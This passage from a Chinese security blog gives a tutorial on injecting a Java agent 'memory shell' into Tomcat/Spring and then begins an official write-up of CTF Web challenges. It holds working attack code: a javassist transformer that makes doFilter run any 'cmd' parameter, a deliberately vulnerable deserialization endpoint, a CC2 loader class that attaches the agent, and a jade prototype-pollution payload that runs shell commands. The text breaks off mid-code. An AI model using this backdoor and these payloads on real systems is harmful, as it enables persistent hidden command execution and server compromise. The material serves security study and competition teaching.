class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> bytesRead;</span><br><span class="line">                    <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        jos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                    &#125;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                    jos.closeEntry();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        jarFile.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>运行一下主类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;agentmain/src/main/java/Demo/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line"><span class="comment">//            System.out.println(v.displayName());</span></span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;MainDemo&quot;</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已找到目标类，将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接，并将 agent.jar 发送给虚拟机&quot;</span>);</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                <span class="comment">// 获取连接后将 agent.jar 发送给虚拟机</span></span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                <span class="comment">// 移除连接</span></span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以发现成功调用了 agent.jar，并输出了加载的类名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240313084226042.png"
                      alt="image-20240313084226042"
                ></p>
<h4 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h4><p>这里还是以 Filter 内存马为例</p>
<p>spring 写个 cc2 的漏洞环境</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>写个反序列化接口</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &#123;&quot;/poc&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">poc</span><span class="params">(<span class="meta">@RequestParam(&quot;poc&quot;)</span> String poc)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bpoc = Base64.decodeBase64(poc);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bpoc));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;wow!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>生成 Filter 内存马的 agent.jar , 记得遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义，否则 ApplicationFilterChain 会修改失败。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> AgentMemShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.LoaderClassPath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(targetClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="comment">// 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错</span></span><br><span class="line">            pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>打包 agent.jar 的时候，顺便把 tools.jar 也一起打进去，否则还需要去目标机器加载，不然就会出现找不到 VirtualMachine 类的问题。我们打入一个jar包，通过 urlclassloader 去获取一个 classloader 就可以来加载我们需要的 VirtualMachine 类了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240313112914457.png"
                      alt="image-20240313112914457"
                ></p>
<p>接着就需要想办法将我们的 agent.jar 加载进去</p>
<p>大致思路还是获取到 jvm 的 pid 号之后，调用 loadAgent 方法将 agent.jar 注入进去，通过反射调用方法即可。（假如服务存在文件上传的口子，能给我们上传 jar）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> AgentMemShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\JNI_Rasp\\agentmain\\src\\main\\java\\AgentMemShell\\jars\\agentmain.jar&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">springApplication</span> <span class="operator">=</span> <span class="string">&quot;com.example.springdemo.SpringDemoApplication&quot;</span>;</span><br><span class="line"></span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(path).toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line"><span class="comment">//            ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span></span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) listMethod.invoke(MyVirtualMachine, <span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o, <span class="literal">null</span>);</span><br><span class="line">                <span class="comment">// 这里的 if 条件根据实际情况进行更改,不加也行，附加在全部的程序上</span></span><br><span class="line">                <span class="keyword">if</span> (name.contains(springApplication)) &#123;</span><br><span class="line">                    <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (String) getId.invoke(o, <span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">                    loadAgent.invoke(vm, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm, <span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后再使用 CC2 去加载这个 Evil 类的字节码就行了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240313120236311.png"
                      alt="image-20240313120236311"
                ></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>吉林省高校网络安全联赛第三轮 Web 官方题解</title>
    <url>/2024/02/08/blog_%E5%90%89%E6%9E%97%E7%9C%81%E7%AC%AC%E4%B8%89%E8%BD%AE%E8%81%94%E8%B5%9B-Web/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>负责了Web和Misc方向的题目设计，这里记录一下本次Web方向的题解。</p>

  </div>

<h2 id="华容道"><a href="#华容道" class="headerlink" title="华容道"></a>华容道</h2><blockquote>
<p>难度：签到</p>
<p>考点：js 前端代码基础</p>
</blockquote>
<p>这题是一个使用 vue 写的前端小游戏，需要将大的正方形方块移动到指定位置获取胜利。修改了 <a class="link"   href="https://conwnet.github.io/huarongdao/" >https://conwnet.github.io/huarongdao/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  这个项目，选用了其中 “峰回路转” 这个布局，额外添加了胜利之后在界面上显示flag内容。</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>直接搜索布局解法，由于使用的布局是经典布局，虽然比较难，但是在互联网上是存在对应解法的。</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>根据逻辑，一般js小游戏都会有一个判断胜利的条件，尝试搜索 “win”，”success” 等关键字，可以发现存在如下内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">t.default = &#123;</span><br><span class="line">          components: &#123;</span><br><span class="line">              Grid: i.default</span><br><span class="line">          &#125;,</span><br><span class="line">          props: [&quot;unitSize&quot;, &quot;layout&quot;],</span><br><span class="line">          data: function () &#123;</span><br><span class="line">              return &#123;</span><br><span class="line">                  state: this.layout,</span><br><span class="line">                  answer: [],</span><br><span class="line">                  thinking: !1</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          computed: &#123;</span><br><span class="line">              width: function () &#123;</span><br><span class="line">                  return 4 * this.unitSize</span><br><span class="line">              &#125;,</span><br><span class="line">              height: function () &#123;</span><br><span class="line">                  return 5.5 * this.unitSize</span><br><span class="line">              &#125;,</span><br><span class="line">              success: function () &#123;</span><br><span class="line">                  return &quot;5&quot; === this.state[13]</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          </span><br><span class="line"> 			.........</span><br></pre></td></tr></table></figure></div>

<p>每次网格中的矩形发生变化时，就会计算当前的 this.state[13] 是否为 “5” （实际上仔细读代码能知道 this.state[13] 即为出口位置，”5”是大方块的一个表示，也即判断当前大方块是否在出口位置），我们可以尝试修改其值为true，并再移动一次方块即可获取flag内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207232013352.png"
                      alt="image-20240207232013352"
                ></p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><blockquote>
<p>难度：简单</p>
<p>考点：jade原型链污染</p>
</blockquote>
<p>题目给出了 app.js 源码 和 package.json 文件</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jade = <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jsYaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;jade&quot;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">text</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;application/x-yaml&#x27;</span> &#125;));</span><br><span class="line"><span class="keyword">let</span> words = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;index.jade&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">datas</span>: words</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/record&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>)&#123;</span><br><span class="line">        <span class="title function_">merge</span>(words, jsYaml.<span class="title function_">load</span>(req.<span class="property">body</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:3000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>很明显存在 jade 原型链污染，但是数据解析使用的是自定义的 ‘application&#x2F;x-yaml’ 形式，使用yaml解析器来解析yaml数据，所以需要将传统的json格式转为yaml格式即可。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a><strong>payload</strong></h3><p><strong>POST</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__proto__:</span><br><span class="line">  self: 1</span><br><span class="line">  line: global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; ./public/1.txt&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207233651306.png"
                      alt="image-20240207233651306"
                ></p>
<p>之后刷新一下首页，再去访问 &#x2F;1.txt 即可获得flag内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207233825782.png"
                      alt="image-20240207233825782"
                ></p>
<h2 id="My-Profile"><a href="#My-Profile" class="headerlink" title="My Profile"></a>My Profile</h2><blockquote>
<p>难度：简单</p>
<p>考点：python 格式化字符串漏洞，python 原型链污染</p>
</blockquote>
<p>通过查看首页源码，发现存在注释内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- /g3ts0uRce 接口记得删除 --&gt;</span><br></pre></td></tr></table></figure></div>

<p>访问该接口可以获取源码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> koishi_secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, info</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.info = info</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户信息&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = MyUser(<span class="string">&quot;阿卡林&quot;</span>, <span class="string">&quot;今年刚满18&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    is_change = <span class="literal">False</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        is_change = <span class="literal">True</span></span><br><span class="line">        data = json.loads(request.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;role&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        data[<span class="string">&quot;info&quot;</span>] = <span class="string">&quot;修改成功&quot;</span></span><br><span class="line">        update(data, instance)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = data[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                instance.name = name</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            age = data[<span 